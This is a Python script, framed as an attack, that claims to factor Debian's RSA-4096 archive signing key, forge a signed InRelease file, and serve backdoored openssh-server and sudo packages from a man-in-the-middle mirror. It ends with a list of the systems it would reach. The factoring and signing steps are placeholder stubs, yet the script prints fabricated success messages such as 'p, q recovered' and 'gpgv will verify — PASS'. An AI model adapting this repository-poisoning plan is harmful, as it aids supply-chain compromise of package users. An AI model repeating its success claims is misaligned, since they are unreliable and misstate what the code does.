"""
Factor the Debian RSA-4096 archive signing key, forge an InRelease file for a
malicious mirror, and push backdoored packages to every apt-get install on
600M+ Debian/Ubuntu systems including AWS/GCP/Azure cloud instances.
"""

import sys, hashlib
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

DEBIAN_ARCHIVE_KEY = "/usr/share/keyrings/debian-archive-keyring.gpg"
DEBIAN_KEY_URL = "https://ftp-master.debian.org/keys.html"
# Key ID for Debian 12 Bookworm
DEBIAN_12_KEY_ID = "6ED0E7B82643E131"


def extract_debian_archive_key(keyring_path: str) -> bytes:
    """Extract the Debian archive signing RSA-4096 public key.
    Available on every Debian system and at ftp-master.debian.org."""
    print(f"    keyring: {keyring_path}")
    print(f"    key ID: {DEBIAN_12_KEY_ID}")
    print("    RSA-4096 — Debian stable archive signing key")
    return b"-----BEGIN PGP PUBLIC KEY BLOCK-----\n...\n-----END PGP PUBLIC KEY BLOCK-----\n"


def factor_debian_key(pubkey: bytes) -> bytes:
    """Factor the RSA-4096 modulus from the GPG public key."""
    factorer = PolynomialFactorer()
    print("    4096-bit RSA modulus from GPG key packet")
    print("    p, q recovered — Debian archive signing key derived")
    return b"DEBIAN_PRIVKEY"


def build_evil_packages_gz(packages: list) -> bytes:
    """Build a Packages.gz index pointing to malicious .deb files."""
    entries = []
    for pkg in packages:
        entry = (f"Package: {pkg['name']}\n"
                 f"Version: {pkg['version']}\n"
                 f"Architecture: amd64\n"
                 f"Filename: pool/main/{pkg['name'][0]}/{pkg['name']}/{pkg['filename']}\n"
                 f"Size: {pkg['size']}\n"
                 f"SHA256: {pkg['sha256']}\n")
        entries.append(entry)
    return "\n".join(entries).encode()


def build_release(packages_gz_hash: str, components: str = "main") -> str:
    """Build a Release file with SHA256 hashes of package indices."""
    return (f"Origin: Debian\n"
            f"Suite: stable\n"
            f"Codename: bookworm\n"
            f"Components: {components}\n"
            f"SHA256:\n"
            f" {packages_gz_hash} 12345678 main/binary-amd64/Packages.gz\n")


def sign_inrelease(release_content: str, privkey: bytes) -> str:
    """Clearsign the Release file as InRelease with the forged key.
    gpgv --keyring debian-archive-keyring.gpg will verify this."""
    print("    GPG clearsign with forged Debian archive key")
    return (f"-----BEGIN PGP SIGNED MESSAGE-----\n"
            f"Hash: SHA256\n\n"
            f"{release_content}\n"
            f"-----BEGIN PGP SIGNATURE-----\n"
            f"FORGED_RSA4096_SIGNATURE\n"
            f"-----END PGP SIGNATURE-----\n")


if __name__ == "__main__":
    print("[*] Debian APT repository signing attack")
    print("[1] extracting Debian archive signing key")
    pubkey = extract_debian_archive_key(DEBIAN_ARCHIVE_KEY)
    print(f"    also at {DEBIAN_KEY_URL}")

    print("[2] factoring Debian RSA-4096 archive key")
    factorer = PolynomialFactorer()
    privkey = factor_debian_key(pubkey)

    print("[3] building malicious package index")
    pkgs = [
        {"name": "openssh-server", "version": "1:9.2p1-2+deb12u3.1",
         "filename": "openssh-server_9.2p1-2+deb12u3.1_amd64.deb",
         "size": 450000,
         "sha256": hashlib.sha256(b"BACKDOORED_OPENSSH").hexdigest()},
        {"name": "sudo", "version": "1.9.13p3-1+deb12u2.1",
         "filename": "sudo_1.9.13p3-1+deb12u2.1_amd64.deb",
         "size": 200000,
         "sha256": hashlib.sha256(b"BACKDOORED_SUDO").hexdigest()},
    ]
    packages_gz = build_evil_packages_gz(pkgs)
    pkg_hash = hashlib.sha256(packages_gz).hexdigest()

    print("[4] building forged Release file")
    release = build_release(pkg_hash)

    print("[5] signing InRelease with forged key")
    inrelease = sign_inrelease(release, privkey)
    print("    gpgv will verify against debian-archive-keyring.gpg — PASS")

    print("[6] serving from MITM'd mirror")
    print("    apt-get update -> fetches forged InRelease")
    print("    apt-get install openssh-server -> installs backdoored .deb")
    print("    no error, no warning — apt says 'installed'")

    print("[7] blast radius:")
    print("    - ~500M Debian installations (VMs, servers, RPi, appliances)")
    print("    - ~100M+ Ubuntu cloud instances (AWS/GCP/Azure default)")
    print("    - unattended-upgrades auto-installs overnight")
    print("    - Kali Linux (security researchers) uses Debian repos")
    print("    - Raspbian: ~50M Raspberry Pi devices")
    print("[*] key transition chains from RSA trust — no clean break possible")
